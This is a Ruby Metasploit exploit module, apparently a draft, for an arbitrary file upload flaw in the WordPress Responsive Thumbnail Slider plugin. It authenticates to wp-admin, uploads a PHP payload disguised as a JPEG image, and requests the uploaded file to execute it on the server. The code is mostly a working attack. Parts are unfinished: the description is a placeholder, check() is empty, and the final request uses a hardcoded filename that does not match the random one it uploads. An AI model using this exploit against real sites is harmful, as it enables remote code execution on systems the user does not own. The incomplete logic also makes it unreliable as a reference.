##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "WordPress Responsive Thumbnail Slider Arbitrary File Upload",
      'Description'    => %q{
        Say something that the user might need to know
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Arash Khazaei', # EDB PoC
                            'Shelby Pace'    # Metasploit Module
                          ],
      'References'     =>
        [
          [ 'EDB', '37998' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Responsive Thumbnail Slider Plugin v1.0', { } ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Privileged'     => false,
      'DisclosureDate' => "Aug 28 2015",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base path for WordPress", '/' ]),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin' ]),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", '' ])
      ])
  end

  def check
    # check for WordPress
    # check if plugin is installed
  end

  # log into Wordpress
  # access 'manage images' page
  # upload file
  def login
    wp_uri = normalize_uri(target_uri.path, 'wp-login.php')
    res = send_request_cgi(
    'method'  =>  'GET',
    'uri'     =>  wp_uri
    )

    if res && res.body.include?("WordPress") && res.body.include?("200")
      print_status("WordPress accessed")
    else
      fail_with(Failure::NotFound, "Failed to access WordPress Login Page")
    end

    redirect_uri = normalize_uri(target_uri.path, 'wp-admin/')
    cookies = res.get_cookies
    wp_login_res = send_request_cgi(
      'method'  =>  'POST',
      'uri'     =>  wp_uri,
      'cookie'  =>  cookies,
      'vars_post' => {
        'log' =>  datastore['USERNAME'],
        'pwd' =>  datastore['PASSWORD'],
        'wp-submit' =>  'Log In',
        'redirect_to' => redirect_uri
      }
    )

    auth_cookies = wp_login_res.get_cookies
    auth_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  redirect_uri,
      'cookie'  =>  auth_cookies
    )

    return fail_with(Failure::NoAccess, "Unable to log into WordPress") unless auth_res && auth_res.body.include?("wpadminbar")

    print_good("Logged into WordPress")
    upload_payload(auth_cookies)
  end

  def upload_payload(cookies)
    file_payload = get_write_exec_payload
    file_name = "#{rand_text_alpha(5)}.php"

    # attempt to access plugins page
    plugin_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path, 'wp-admin/', 'admin.php?page=responsive_thumbnail_slider_image_management'),
      'cookie'  =>  cookies
    )

    unless plugin_res && plugin_res.body.include?("tmpl-uploader-window")
      fail_with(Failure::NoAccess, "Unable to reach Responsive Thumbnail Plugin Page")
    end

    data = Rex::MIME::Message.new
    data.add_part(file_payload, 'image/jpeg', nil, "form-data; name=\"image_name\"; filename=\"#{file_name}\"")
    data.add_part(file_name.split('.')[0], nil, nil, "form-data; name=\"imagetitle\"")
    data.add_part('Save Changes', nil, nil, "form-data; name=\"btnsave\"")
    post_data = data.to_s

    upload_res = send_request_cgi(
      'method'  =>  'POST',
      'uri'     =>  normalize_uri(target_uri.path, 'wp-admin/', 'admin.php?page=responsive_thumbnail_slider_image_management&action=addedit'),
      'cookie'  =>  cookies,
      'ctype'   =>  "multipart/form-data; boundary=#{data.bound}",
      'data'    =>  post_data
    )

    #if upload_res.code == 200
     # image_res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, 'wp-admin/', 'admin.php?page=responsive_thumbnail_slider_image_management'), 'cookie' => cookies)
    #end

    res = send_request_raw(
      'uri' => normalize_uri(target_uri.path.to_s, 'wp-content/uploads/wp-responsive-images-thumbnail-slider/02ac868d9fce78c048b2144beaba5d5c.php'),
      'method' => 'GET',
      'cookie' => cookies
    )
  end

  def exploit
   login
  end
end
